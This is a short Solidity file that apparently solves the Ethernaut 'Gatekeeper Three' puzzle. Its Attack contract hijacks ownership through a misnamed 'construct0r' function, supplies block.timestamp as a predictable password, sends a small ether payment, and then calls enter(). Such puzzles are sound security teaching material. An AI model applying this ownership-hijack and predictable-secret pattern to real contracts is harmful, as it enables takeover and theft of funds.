//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract Attack {
    function enter(IGatekeeperThree gate) external payable {
        gate.construct0r();
        gate.createTrick();
        gate.getAllowance(block.timestamp);
        (bool s, ) = address(gate).call{value: 0.0011 ether}("");
        require(s);
        gate.enter();
    }
}


















